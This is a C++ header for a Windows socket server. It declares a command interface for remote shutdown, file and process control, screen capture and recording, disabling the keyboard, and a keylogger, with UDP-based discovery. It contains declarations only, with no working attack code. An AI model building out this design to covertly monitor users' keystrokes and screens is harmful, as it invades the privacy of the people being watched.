#ifndef SERVER_SOCKET_HPP
#define SERVER_SOCKET_HPP

#include <iostream>
#include <unordered_map>
#include <functional>
#include <limits>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <tchar.h>
#include <thread>
#include <atomic>
#include <regex>
#pragma comment(lib, "ws2_32.lib")

#include "./../WindowAPI/KeyboardDisabler.hpp"
#include "./../WindowAPI/Keylogger.hpp"
#include "./../WindowAPI/VideoRecorder.hpp"
#include "./../WindowAPI/FileOperations.hpp"
#include "./../WindowAPI/ProcessOperations.hpp"
#include "./../WindowAPI/SystemOperations.hpp"


#define PORT 8080
// #define SERVER_IP "127.0.0.1"
#define DISCOVERY_PORT 8081
#define DISCOVERY_MESSAGE "DISCOVER_SERVER"

enum MessageType {
    SHUTDOWN,
    RESTART,
    GET_IP,
    HELLO_SERVER,
    STOP,
    INVALID,
    CAPTURE_SCREEN,
    COPY_FILE,
    DELETE_FILE,
    CREATE_FOLDER,
    COPY_FOLDER,
    LIST_COMMANDS,
    LIST_PROCESS,
    LIST_SERVICES,
    START_APP,
    TERMINATE_PROCESS,
    LIST_RUNNING_APP,
    LIST_INSTALLED_APP,
    LIST_FILES,
    DISABLE_KEYBOARD,
    ENABLE_KEYBOARD,
    DISABLE_KEYLOGGER,
    ENABLE_KEYLOGGER,
    KEY_LOGGER,
    SCREEN_RECORDING
};

class ServerSocket {
private:
    SOCKET serverSocket;
    sockaddr_in serverAddress;

    static std::unordered_map<std::string, MessageType> messageMap;

    std::unordered_map<MessageType, std::function<void(SOCKET&, const std::string& command)>> handlers;

    MessageType hashMessage(const std::string message);

    void initializeHandlers();

    Keylogger *keylogger;

    VideoRecorder *recorder;

    KeyboardDisabler *keyboardDisabler;

    FileOperations *fileOperations;

    ProcessOperations *processOperations;

    SystemOperations *systemOperations;

    std::string response;

    std::string keyloggerFilePath;

    void handleDiscoveryRequests();

public:
    ServerSocket();

    ~ServerSocket();

    std::vector<std::string> parseCommand(const std::string &command);

    void sendResponse(SOCKET &clientSocket, const std::string& response);  

    void sendIPAddress(SOCKET &clientSocket);

    void sendMessage(SOCKET &clientSocket, const char* message);

    SOCKET getSocket() { return serverSocket; }

    void handleEvent(SOCKET &clientSocket, const std::string& message);

    void sendFile(SOCKET &clientSocket, const std::string& filePath);
};

#endif